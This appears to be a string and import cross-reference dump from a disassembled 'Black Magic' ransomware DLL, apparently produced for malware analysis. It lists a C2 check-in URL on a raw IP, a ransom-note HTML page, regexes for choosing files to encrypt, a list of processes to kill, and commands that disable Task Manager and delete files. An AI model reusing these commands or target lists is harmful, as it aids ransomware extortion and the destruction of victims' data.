reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x180001ce4	0x180081c10	string	0x180001c60	bad locale name
0x180002557	0x1800023d0	string	0x1800024f0	@SVWH
0x1800030e3	0x180081cf8	string	0x1800030b0	NameValuePairs: type mismatch for '
0x1800030f4	0x180081ce8	string	0x1800030b0	', stored '
0x18000312a	0x180081cd0	string	0x1800030b0	', trying to retrieve '
0x180003aeb	0x180081ed0	string	0x180003ab0	AlgorithmParametersBase: parameter "
0x180003b0f	0x180081ec0	string	0x180003ab0	" not used
0x1800049c5	0x180081e00	string	0x180004940	InputBuffer
0x1800049dd	0x180027000	string	0x180004940	@UVWH
0x180004bbc	0x180081e00	string	0x180004b10	InputBuffer
0x180004eb4	0x180081e10	string	0x180004dd0	InputFileName
0x180004ed0	0x180081e20	string	0x180004dd0	InputBinaryMode
0x180004eda	0x1800193f0	string	0x180004dd0	@VWAVH
0x180005315	0x180081ea8	string	0x180005290	DecodingLookupArray
0x180005331	0x180081e98	string	0x180005290	Log2Base
0x18000533b	0x180019210	string	0x180005290	@VWAVH
0x180005663	0x180081e78	string	0x1800054f0	Uppercase
0x18000567d	0x180081e88	string	0x1800054f0	GroupSize
0x180005687	0x180019210	string	0x1800054f0	@VWAVH
0x180005696	0x180081e58	string	0x1800054f0	Separator
0x1800056a0	0x180019110	string	0x1800054f0	@VWAVH
0x1800056af	0x180081e68	string	0x1800054f0	Terminator
0x1800056b9	0x180019110	string	0x1800054f0	@VWAVH
0x180005aef	0x18006c380	import	0x180005ac0	WS2_32.dll.WSAStartup
0x180005b3d	0x180081f50	string	0x180005ac0	WSAStartup failed
0x180005b62	0x18006c378	import	0x180005ac0	WS2_32.dll.WSACleanup
0x180005b8f	0x180081f68	string	0x180005ac0	Invalid WinSock version
0x180005bc5	0x18006c378	import	0x180005ac0	WS2_32.dll.WSACleanup
0x180005c41	0x180081f80	string	0x180005bd0	Unsupported protocol
0x180005d1b	0x18006c368	import	0x180005cf0	WS2_32.dll.socket
0x180005d3f	0x18006c360	import	0x180005cf0	WS2_32.dll.ioctlsocket
0x180005de9	0x18006c330	import	0x180005de0	WS2_32.dll.closesocket
0x180005e29	0x18006c358	import	0x180005e00	WS2_32.dll.connect
0x180005e36	0x18006c370	import	0x180005e00	WS2_32.dll.WSAGetLastError
0x180005e4c	0x18006c358	import	0x180005e00	WS2_32.dll.connect
0x180006021	0x18006c338	import	0x180005f70	WS2_32.dll.select
0x180006032	0x18006c370	import	0x180005f70	WS2_32.dll.WSAGetLastError
0x18000604f	0x18006c338	import	0x180005f70	WS2_32.dll.select
0x18000606a	0x18006c370	import	0x180005f70	WS2_32.dll.WSAGetLastError
0x180006093	0x180082038	string	0x180005f70	Failed to select socket
0x18000615b	0x180082050	string	0x180005f70	Request timed out
0x180006248	0x180082068	string	0x180006200	HTTP/1.1\r\n
0x180006566	0x180082078	string	0x180006340	Invalid header field name
0x180006626	0x180082098	string	0x1800065d0	http
0x180006651	0x1800820a0	string	0x1800065d0	Only HTTP scheme is supported
0x1800067fa	0x1800820c0	string	0x1800065d0	Host
0x18000687e	0x1800820c8	string	0x1800065d0	Content-Length
0x1800069f3	0x1800820d8	string	0x1800065d0	Basic
0x180006a1b	0x1800820e0	string	0x1800065d0	Authorization
0x180006f2e	0x180006f60	string	0x180006ea0	@USVWATAUAVAWH
0x180006feb	0x180082098	string	0x180006f60	http
0x180007014	0x1800820a0	string	0x180006f60	Only HTTP scheme is supported
0x1800070d4	0x18006c328	import	0x180006f60	WS2_32.dll.getaddrinfo
0x1800070de	0x18006c370	import	0x180006f60	WS2_32.dll.WSAGetLastError
0x1800070f1	0x1800820f8	string	0x180006f60	Failed to get address info of
0x180007141	0x18006c320	import	0x180006f60	WS2_32.dll.freeaddrinfo
0x180007192	0x1800065d0	string	0x180006f60	@USVWATAUAVAWH
0x180007220	0x180005e00	string	0x180006f60	@SUVWAVH
0x1800072a7	0x180005f70	string	0x180006f60	@UVWAVAWH
0x1800072b8	0x18006c348	import	0x180006f60	WS2_32.dll.send
0x1800072c5	0x18006c370	import	0x180006f60	WS2_32.dll.WSAGetLastError
0x1800072de	0x18006c348	import	0x180006f60	WS2_32.dll.send
0x180007301	0x18006c370	import	0x180006f60	WS2_32.dll.WSAGetLastError
0x180007311	0x180082008	string	0x180006f60	Failed to send data
0x180007423	0x180005f70	string	0x180006f60	@UVWAVAWH
0x18000743b	0x18006c340	import	0x180006f60	WS2_32.dll.recv
0x180007448	0x18006c370	import	0x180006f60	WS2_32.dll.WSAGetLastError
0x180007468	0x18006c340	import	0x180006f60	WS2_32.dll.recv
0x18000761f	0x180082118	string	0x180006f60	transfer-encoding
0x180007633	0x180082130	string	0x180006f60	chunked
0x180007652	0x180082158	string	0x180006f60	content-length
0x1800076b5	0x180011010	string	0x180006f60	@SVWH
0x180007c5a	0x180082138	string	0x180006f60	Unsupported transfer encoding:
0x180007d3c	0x180082168	string	0x180006f60	Invalid chunk
0x180007e9a	0x18006c330	import	0x180006f60	WS2_32.dll.closesocket
0x180007eb2	0x18006c320	import	0x180006f60	WS2_32.dll.freeaddrinfo
0x180007ebe	0x18006c370	import	0x180006f60	WS2_32.dll.WSAGetLastError
0x180007ece	0x180082020	string	0x180006f60	Failed to read data
0x180008124	0x18006c068	import	0x1800080b0	KERNEL32.dll.GetFullPathNameW
0x18000815a	0x18006c068	import	0x1800080b0	KERNEL32.dll.GetFullPathNameW
0x18000820c	0x18006c0b8	import	0x1800081e0	KERNEL32.dll.FindClose
0x180008261	0x18006c078	import	0x180008230	KERNEL32.dll.FindFirstFileExW
0x180008288	0x18006c080	import	0x180008230	KERNEL32.dll.GetLastError
0x18000842e	0x18006c088	import	0x1800083d0	KERNEL32.dll.FindNextFileW
0x180008535	0x18006c088	import	0x1800083d0	KERNEL32.dll.FindNextFileW
0x18000861e	0x18006c0b8	import	0x1800085d0	KERNEL32.dll.FindClose
0x1800086bd	0x18008217c	string	0x180008680	Time:
0x1800086e7	0x1800177e0	string	0x180008680	@VWATAVAWH
0x180008700	0x1800177e0	string	0x180008680	@VWATAVAWH
0x180008720	0x1800177e0	string	0x180008680	@VWATAVAWH
0x180008737	0x180082184	string	0x180008680	
0x18000873e	0x1800177e0	string	0x180008680	@VWATAVAWH
0x18000875c	0x1800177e0	string	0x180008680	@VWATAVAWH
0x18000877a	0x1800177e0	string	0x180008680	@VWATAVAWH
0x180008790	0x180082190	string	0x180008680	
0x180008797	0x1800177e0	string	0x180008680	@VWATAVAWH
0x1800087b7	0x1800177e0	string	0x180008680	@VWATAVAWH
0x1800087d3	0x1800177e0	string	0x180008680	@VWATAVAWH
0x1800087e8	0x180082184	string	0x180008680	
0x1800087ef	0x1800177e0	string	0x180008680	@VWATAVAWH
0x18000880b	0x1800177e0	string	0x180008680	@VWATAVAWH
0x180008991	0x1800821b0	string	0x180008880	ipconfig > c:\users\public\Documents\ip.txt
0x1800089a7	0x1800821e0	string	0x180008880	c:\users\public\Documents\ip.txt
0x180008a75	0x18001a2f0	string	0x180008880	@VWATAVAWH
0x180008a80	0x1800821a0	string	0x180008880	IPv4 Address
0x180008a8e	0x1800124c0	string	0x180008880	@UAVAWH
0x180008c2f	0x180082208	string	0x180008880	del /f c:\users\public\Documents\ip.txt
0x180008da1	0x180082268	string	0x180008d30	http://5.230.70.49/api/public/api/test?ip=
0x180008db3	0x180082258	string	0x180008d30	&status=
0x180008dd9	0x180082230	string	0x180008d30	&cnt=100&type=server&num=11111170
0x180009266	0x18006c378	import	0x180008d30	WS2_32.dll.WSACleanup
0x18000951e	0x18006c090	import	0x1800094a0	KERNEL32.dll.GetLogicalDriveStringsA
0x180009750	0x180029f40	string	0x180009680	@VWAVH
0x180009958	0x180012a50	string	0x180009680	@SUVH
0x180009973	0x180022410	string	0x180009680	@SVWH
0x180009b70	0x180012a50	string	0x180009680	@SUVH
0x180009b8d	0x180022410	string	0x180009680	@SVWH
0x180009e0e	0x180005290	string	0x180009d30	@SWH
0x180009f15	0x180005290	string	0x180009d30	@SWH
0x18000a3ce	0x1800240e0	string	0x18000a0c0	@SVWH
0x18000a3d4	0x1800822b8	string	0x18000a0c0	.BlackMagic
0x18000a47d	0x180081e30	string	0x18000a0c0	OutputFileName
0x18000a49f	0x180081e40	string	0x18000a0c0	OutputBinaryMode
0x18000a4a9	0x1800193f0	string	0x18000a0c0	@VWAVH
0x18000b129	0x1800822c8	string	0x18000b050	\HackedByBlackMagic.txt
0x18000b200	0x1800822e0	string	0x18000b050	Black Magic Has Targeted You!
0x18000b20c	0x1800177e0	string	0x18000b050	@VWATAVAWH
0x18000b221	0x180082300	string	0x18000b050	Telegram:blakmagic2511
0x18000b22d	0x1800177e0	string	0x18000b050	@VWATAVAWH
0x18000b23a	0x180082318	string	0x18000b050	Twitter:blakmagic2511
0x18000b246	0x1800177e0	string	0x18000b050	@VWATAVAWH
0x18000b253	0x180082330	string	0x18000b050	Facebook:blakmagic2511
0x18000b25f	0x1800177e0	string	0x18000b050	@VWATAVAWH
0x18000b26c	0x180082348	string	0x18000b050	Youtube:blakmagic7533
0x18000b278	0x1800177e0	string	0x18000b050	@VWATAVAWH
0x18000b39a	0x180082360	string	0x18000b340	<!DOCTYPE html><html><head><title>Hacked By Black Magic</title><style>body {\tbackground-image: url('http://193.182.144.85/poster.jpg');\tbackground-repeat: no-repeat;\tbackground-size: cover;}</style></head><body><h1 style='margin-left: 200px;display: none;'>Hacked By Black Magic</h1><div style='width:100%;margin-bottom:5px'>\t\t<div style='position: fixed;left: 0;bottom: 10px;width: 100%;text-align: center;'>\t\t<nav style='text-align:center'> \t\t\t<a href='https://t.me/BlackMagic2511'><img src='http://193.182.144.85/telegram.png' style='width:40px;'></a> \t\t\t<a href='https://www.youtube.com/channel/UCqQ1XGFGJ-zJggRnR7hh1dA'><img src='http://193.182.144.85/youtube.png' style='width:40px;margin-inline: 20px;'></a> \t\t\t<a href='https://twitter.com/BlackMagic2511'><img src='http://193.182.144.85/twitter.png' style='width:40px;'></a> \t\t\t<a href='https://www.facebook.com/blackmagic2511'><img src='http://193.182.144.85/facebook.png' style='width:40px;margin-inline: 20px;'></a>\t\t</nav>\t</div></div></body></html>
0x18000b4b9	0x180017ac0	string	0x18000b340	@VWATAVAWH
0x18000b8a8	0x180082770	string	0x18000b5f0	^.*\.([mM][pP][4]|[mM][pP][3]|[wW][mM][vV]|[mM][oO][vV]|[tT][sS]|[mM][3][uU][8]|[mM][4][vV]|[eE][xX][eE]|[sS][oO]|[rR][pP][mM]|[dD][eE][bB]|[vV][mM][lL][iI][nN][uU][zZ]|[iI][mM][gG]|[cC][fF][gG]|[lL][iI][sS][tT]|[jJ][pP][gG]|[jJ][pP][eE][gG]|[bB][mM][pP]|[gG][iI][fF]|[pP][nN][gG]|[sS][vV][gG]|[pP][sS][dD]|[rR][aA][wW]|[iI][cC][oO]|[mM][pP][33]|[mM][pP][44]|[mM][44][aA]|[aA][aA][cC]|[oO][gG][gG]|[fF][lL][aA][cC]|[wW][aA][vV]|[wW][mM][aA]|[aA][iI][fF][fF]|[aA][pP][eE]|[aA][vV][iI]|[fF][lL][vV]|[mM][44][vV]|[mM][kK][vV]|[mM][oO][vV]|[mM][pP][gG]|[mM][pP][eE][gG]|[wW][mM][vV]|[sS][wW][fF]|[33][gG][pP]|[dD][oO][cC]|[dD][oO][cC][xX]|[xX][lL][sS]|[xX][lL][sS][xX]|[pP][pP][tT]|[pP][pP][tT][xX]|[oO][dD][tT]|[oO][dD][pP]|[oO][dD][sS]|[tT][xX][tT]|[rR][tT][fF]|[tT][eE][xX]|[pP][dD][fF]|[eE][pP][uU][bB]|[mM][dD]|[AA][dD][oO][bB][eE]|[LL][aA][tT][eE][xX]|[MM][aA][rR][kK][dD][oO][wW][nN]|[eE][tT][cC]|[yY][mM][lL]|[yY][aA][mM][lL]|[jJ][sS][oO][nN]|[xX][mM][lL]|[cC][sS][vV]|[cC][oO][nN][fF]|[cC][oO][nN][fF][iI][gG]|[dD][bB]|[sS][qQ][lL]|[dD][bB][fF]|[mM][dD][bB]|[nN][dD][bB]|[lL][dD][bB]|[iI][sS][oO]|[mM][dD][fF]|[hH][tT][mM][lL]|[hH][tT][mM]|[xX][hH][tT][mM][lL]|[pP][hH][pP]|[aA][sS][pP]|[aA][sS][pP][xX]|[jJ][sS]|[jJ][sS][pP]|[cC][sS][sS]|[dD][aA][tT]|[cC]|[cC][pP][pP]|[cC][xX][xX]|[hH]|[hH][pP][pP]|[hH][xX][xX]|[cC][sS]|[jJ][aA][vV][aA]|[cC][lL][aA][sS][sS]|[jJ][aA][rR]|[pP][sS]|[bB][aA][tT]|[vV][bB]|[aA][wW][kK]|[sS][hH]|[cC][gG][iI]|[pP][lL]|[aA][dD][aA]|[sS][wW][iI][fF][tT]|[gG][oO]|[pP][yY]|[pP][yY][cC]|[bB][fF]|[cC][oO][fF][fF][eE][eE]|[zZ][iI][pP]|[tT][aA][rR]|[tT][gG][zZ]|[bB][zZ][22]|[77][zZ]|[rR][aA][rR]|[bB][aA][kK]|[gG][zZ]|[bB][aA][cC][kK]|[bB][aA][cC])$
0x18000b934	0x180082e10	string	0x18000b5f0	[aA][rR][cC][hH][iI][eE][vV][eE]|[cC][oO][nN][fF][iI][gG]|[cC][pP][aA][nN][eE][lL]|[iI][nN][vV][oO][iI][cC][eE]|[rR][eE][cC][oO][rR][dD][iI][nN][gG]|[aA][cC][cC][eE][sS][sS]|[sS][iI][tT][eE]|[nN][oO][tT][eE] |[pP][oO][wW][eE][rR][pP][nN][tT]|[wW][iI][nN][wW][oO][rR][dD]|[vV][mM][wW][pP]|[vV][iI][rR][tT][uU][aA][lL][bB][oO][xX]|[vV][bB][oO][xX]|[sS][qQ][lL][sS][eE][rR][vV][eE][rR]|[mM][yY][sS][qQ][lL][dD]|[oO][mM][tT][sS][tT][rR][eE][cC][oO]|[oO][rR][aA][cC][lL][eE]|[mM][oO][nN][gG][oO][dD][bB]|[eE][xX][cC][eE][lL]|[EE][xX][cC][hH][aA][nN][gG][eE]|[sS][qQ][lL]|[tT][oO][mM][cC][aA][tT]|[aA][pP][aA][cC][hH][eE]|[hH][tT][tT][pP][dD]|[dD][oO][cC][kK][eE][rR]|[vV][mM][wW][aA][rR][eE]|[nN][gG][iI][nN][xX]|[UU][sS][eE][rR][sS]|[hH][oO][mM][eE]
0x18000b9c0	0x180083100	string	0x18000b5f0	^[cC]+(..)+(Windows|Program Files (x86)|ProgramData|Program Files|pagefile.sys|System Volume Information)
0x18000ba4c	0x180083170	string	0x18000b5f0	back.bmp|HackedByBlackMagic.txt|^.*\.(BlackMagic)|^[cC]+(..)+(inetpub)|inetsrv|temp|^[cC]+(..)+(Windows)
0x18000bad8	0x1800831e0	string	0x18000b5f0	^[cC]+(..)+(inetpub)+(.)+(wwwroot)|^[cC]+(..)+(inetpub)+(.)+(custerr)
0x18000bb64	0x180083228	string	0x18000b5f0	(.)+(Microsoft)+(.)+(Windows)+(.)+(Themes)+(.)+(CachedFiles)
0x18000bb8d	0x1800083d0	string	0x18000b5f0	@SUWAVAWH
0x18000be9b	0x18001a4b0	string	0x18000b5f0	@UVWAVAWH
0x18000bea9	0x18006c098	import	0x18000b5f0	KERNEL32.dll.Sleep
0x18000bf31	0x18001a4b0	string	0x18000b5f0	@UVWAVAWH
0x18000bf73	0x18001a4b0	string	0x18000b5f0	@UVWAVAWH
0x18000bfb4	0x180083270	string	0x18000b5f0	C:\Users\Public\Documents\back.bmp
0x18000c004	0x18000fed0	string	0x18000b5f0	@VWATAVAWH
0x18000c0b2	0x18001a4b0	string	0x18000b5f0	@UVWAVAWH
0x18000c129	0x1800832d8	string	0x18000b5f0	del /f
0x18000c1ac	0x18001a4b0	string	0x18000b5f0	@UVWAVAWH
0x18000c1ee	0x18001a4b0	string	0x18000b5f0	@UVWAVAWH
0x18000c26b	0x1800832d8	string	0x18000b5f0	del /f
0x18000c43b	0x18000b5f0	string	0x18000b5f0	@SVWH
0x18000c92e	0x18006c098	import	0x18000c8e0	KERNEL32.dll.Sleep
0x18000c937	0x1800832e8	string	0x18000c8e0	File
0x18000c949	0x1800832e0	string	0x18000c8e0	.txt
0x18000cac3	0x1800832e8	string	0x18000c8e0	File
0x18000cadc	0x180017ac0	string	0x18000c8e0	@VWATAVAWH
0x18000cb2a	0x1800832f0	string	0x18000c8e0	-----------------------
0x18000cb35	0x1800177e0	string	0x18000c8e0	@VWATAVAWH
0x18000cb68	0x1800832e8	string	0x18000c8e0	File
0x18000cb81	0x180017ac0	string	0x18000c8e0	@VWATAVAWH
0x18000cda9	0x18006c098	import	0x18000cd10	KERNEL32.dll.Sleep
0x18000cde1	0x18006c098	import	0x18000cd10	KERNEL32.dll.Sleep
0x18000ce4d	0x18006c098	import	0x18000cd10	KERNEL32.dll.Sleep
0x18000ce98	0x18006c098	import	0x18000cd10	KERNEL32.dll.Sleep
0x18000ceec	0x180083318	string	0x18000cd10	teamview*
0x18000cf1f	0x180083328	string	0x18000cd10	anydesk*
0x18000cf52	0x180083338	string	0x18000cd10	tnslsnr*
0x18000cf85	0x180083348	string	0x18000cd10	vmware*
0x18000cfb8	0x180083350	string	0x18000cd10	nginx*
0x18000cfeb	0x180083358	string	0x18000cd10	httpd*
0x18000d01e	0x180083360	string	0x18000cd10	docker*
0x18000d051	0x180083368	string	0x18000cd10	bak*
0x18000d084	0x180083370	string	0x18000cd10	site*
0x18000d0ea	0x180083380	string	0x18000cd10	postfix*
0x18000d11d	0x18008338c	string	0x18000cd10	imap*
0x18000d150	0x180083394	string	0x18000cd10	pop3*
0x18000d183	0x1800833a0	string	0x18000cd10	clamav*
0x18000d1b6	0x1800833a8	string	0x18000cd10	qemu*
0x18000d1e9	0x1800833b0	string	0x18000cd10	cpanel*
0x18000d21c	0x1800833b8	string	0x18000cd10	note*
0x18000d24f	0x1800833c0	string	0x18000cd10	powerpnt*
0x18000d282	0x1800833d0	string	0x18000cd10	winword*
0x18000d2b5	0x1800833dc	string	0x18000cd10	excel*
0x18000d2e8	0x1800833e8	string	0x18000cd10	exchange*
0x18000d31b	0x1800833f4	string	0x18000cd10	sql*
0x18000d34e	0x180083400	string	0x18000cd10	tomcat*
0x18000d381	0x180083408	string	0x18000cd10	apache*
0x18000d3b4	0x180083410	string	0x18000cd10	java*
0x18000d3e7	0x180083418	string	0x18000cd10	python*
0x18000d41a	0x180083420	string	0x18000cd10	vee*
0x18000d44d	0x180083428	string	0x18000cd10	post*
0x18000d480	0x180083430	string	0x18000cd10	mys*
0x18000d4b3	0x180083438	string	0x18000cd10	vmwp*
0x18000d4e6	0x180083440	string	0x18000cd10	virtualbox*
0x18000d519	0x18008344c	string	0x18000cd10	vbox*
0x18000d54d	0x180083458	string	0x18000cd10	sqlserver*
0x18000d561	0x180083468	string	0x18000cd10	mysqld*
0x18000d575	0x180083470	string	0x18000cd10	omtstreco*
0x18000d589	0x180083480	string	0x18000cd10	oracle*
0x18000d59d	0x180083488	string	0x18000cd10	mongodb*
0x18000d5b1	0x180083498	string	0x18000cd10	invoice*
0x18000d5c5	0x1800834a8	string	0x18000cd10	inetpub*
0x18000d5f3	0x1800834b8	string	0x18000cd10	taskkill /f /im
0x18000d61a	0x18006c098	import	0x18000cd10	KERNEL32.dll.Sleep
0x18000d652	0x18006c098	import	0x18000cd10	KERNEL32.dll.Sleep
0x18000d65d	0x18006c098	import	0x18000cd10	KERNEL32.dll.Sleep
0x18000d663	0x1800834d0	string	0x18000cd10	reg add hkcu\software\microsoft\windows\currentversion\policies\system /v disabletaskmgr /t reg_dword /d 1 /f
0x18000d691	0x18006c098	import	0x18000cd10	KERNEL32.dll.Sleep
0x18000d732	0x18000b5f0	string	0x18000cd10	@SVWH
0x18000d73c	0x18006c098	import	0x18000cd10	KERNEL32.dll.Sleep
0x18000d783	0x180083548	string	0x18000cd10	c:\users\public\Documents\next.bat
0x18000d793	0x180083570	string	0x18000cd10	ping -n 4 127.0.0.1
0x18000d79e	0x1800177e0	string	0x18000cd10	@VWATAVAWH
0x18000d7ab	0x180083590	string	0x18000cd10	reg add "hkey_current_user\control panel\desktop" /v wallpaper /t reg_sz /d C:\Users\Public\Documents\back.bmp /f
0x18000d7b6	0x1800177e0	string	0x18000cd10	@VWATAVAWH
0x18000d7c3	0x180083608	string	0x18000cd10	ping -n 3 127.0.0.1
0x18000d7ce	0x1800177e0	string	0x18000cd10	@VWATAVAWH
